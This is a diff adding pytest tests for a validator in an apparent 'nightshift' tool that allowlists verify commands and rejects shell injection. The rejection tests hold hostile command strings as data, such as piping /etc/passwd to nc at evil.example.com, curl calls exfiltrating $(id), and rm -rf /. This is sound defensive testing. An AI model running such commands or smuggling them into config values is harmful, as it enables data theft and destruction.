@@ -9291,6 +9291,152 @@ class TestGitStatusShort:
         assert is_clean is False
 
 
+# --- validate_verify_command -------------------------------------------------
+
+
+class TestValidateVerifyCommand:
+    """Security: verify_command must pass the allowlist check before execution."""
+
+    # --- safe commands accepted -----------------------------------------------
+
+    def test_npm_test(self):
+        nightshift.validate_verify_command("npm test")
+
+    def test_npm_run_test_ci(self):
+        nightshift.validate_verify_command("npm run test:ci")
+
+    def test_pnpm_test(self):
+        nightshift.validate_verify_command("pnpm test")
+
+    def test_yarn_test(self):
+        nightshift.validate_verify_command("yarn test")
+
+    def test_bun_test(self):
+        nightshift.validate_verify_command("bun test")
+
+    def test_python3_pytest(self):
+        nightshift.validate_verify_command("python3 -m pytest")
+
+    def test_python3_compileall(self):
+        nightshift.validate_verify_command("python3 -m compileall apps/api/app")
+
+    def test_cargo_test(self):
+        nightshift.validate_verify_command("cargo test")
+
+    def test_go_test(self):
+        nightshift.validate_verify_command("go test ./...")
+
+    def test_make_bare(self):
+        nightshift.validate_verify_command("make")
+
+    def test_make_with_target(self):
+        nightshift.validate_verify_command("make test")
+
+    def test_make_check(self):
+        nightshift.validate_verify_command("make check")
+
+    def test_bash_nightshift_scripts(self):
+        nightshift.validate_verify_command("bash nightshift/scripts/smoke-test.sh")
+
+    def test_sh_nightshift_scripts(self):
+        nightshift.validate_verify_command("sh nightshift/scripts/test.sh")
+
+    def test_leading_whitespace_stripped(self):
+        nightshift.validate_verify_command("  npm test  ")
+
+    # --- injection attempts rejected ------------------------------------------
+
+    def test_semicolon_injection(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("curl http://evil.example.com; rm -rf /")
+
+    def test_pipe_injection(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("cat /etc/passwd | nc evil.example.com 9999")
+
+    def test_ampersand_injection(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("sleep 1 && curl http://evil.example.com/$(id)")
+
+    def test_backtick_injection(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("echo `id`")
+
+    def test_dollar_paren_injection(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("echo $(id)")
+
+    def test_unknown_binary_with_metachar(self):
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("my-test-tool; rm -rf /")
+
+    def test_empty_string_rejected(self):
+        with pytest.raises(nightshift.NightshiftError, match="must not be empty"):
+            nightshift.validate_verify_command("")
+
+    def test_whitespace_only_rejected(self):
+        with pytest.raises(nightshift.NightshiftError, match="must not be empty"):
+            nightshift.validate_verify_command("   ")
+
+    # --- unknown binaries are rejected (allowlist is required) ----------------
+
+    def test_unknown_binary_without_metachar_is_rejected(self):
+        # Commands not starting with a known-safe prefix are rejected even
+        # when they contain no metacharacters, to prevent unknown binaries
+        # from being executed via the verify pipeline.
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("my-test-runner --fast")
+
+    def test_npm_prefixed_injection_rejected(self):
+        # Even allowlisted prefixes must not contain metacharacters.
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.validate_verify_command("npm test; curl http://evil.example.com")
+
+    # --- config-load integration: merge_config rejects injection in file ------
+
+    def test_merge_config_rejects_injected_verify_command(self, tmp_path):
+        (tmp_path / ".nightshift.json").write_text(
+            json.dumps({"verify_command": "npm test; curl http://evil.example.com/$(id)"})
+        )
+        with pytest.raises(nightshift.NightshiftError, match="verify_command rejected"):
+            nightshift.merge_config(tmp_path)
+
+    def test_merge_config_accepts_safe_verify_command(self, tmp_path):
+        (tmp_path / ".nightshift.json").write_text(json.dumps({"verify_command": "npm run test:ci"}))
+        config = nightshift.merge_config(tmp_path)
+        assert config["verify_command"] == "npm run test:ci"
+
+    # --- inferred commands pass validation (belt-and-suspenders) --------------
+
+    def test_inferred_cargo_test_passes(self, tmp_path):
+        (tmp_path / "Cargo.toml").touch()
+        result = nightshift.infer_verify_command(tmp_path, {"verify_command": None})
+        assert result == "cargo test"
+
+    def test_inferred_go_test_passes(self, tmp_path):
+        (tmp_path / "go.mod").touch()
+        result = nightshift.infer_verify_command(tmp_path, {"verify_command": None})
+        assert result == "go test ./..."
+
+    def test_inferred_python3_pytest_passes(self, tmp_path):
+        (tmp_path / "pyproject.toml").touch()
+        result = nightshift.infer_verify_command(tmp_path, {"verify_command": None})
+        assert result == "python3 -m pytest"
+
+    def test_inferred_npm_test_passes(self, tmp_path):
+        (tmp_path / "package.json").write_text(json.dumps({"scripts": {"test": "jest"}}))
+        result = nightshift.infer_verify_command(tmp_path, {"verify_command": None})
+        assert result == "npm test"
+
+    # --- VERIFY_COMMAND_ALLOWLIST_PREFIXES is importable and non-empty --------
+
+    def test_allowlist_exported(self):
+        assert isinstance(nightshift.VERIFY_COMMAND_ALLOWLIST_PREFIXES, list)
+        assert len(nightshift.VERIFY_COMMAND_ALLOWLIST_PREFIXES) > 0
+        assert any("npm" in p for p in nightshift.VERIFY_COMMAND_ALLOWLIST_PREFIXES)
+        assert any("cargo" in p for p in nightshift.VERIFY_COMMAND_ALLOWLIST_PREFIXES)
+
+
 def _init_git_repo_for_test_mode(repo: Path) -> Path:
     repo.mkdir()
     subprocess.run(["git", "init"], cwd=repo, capture_output=True, check=True)
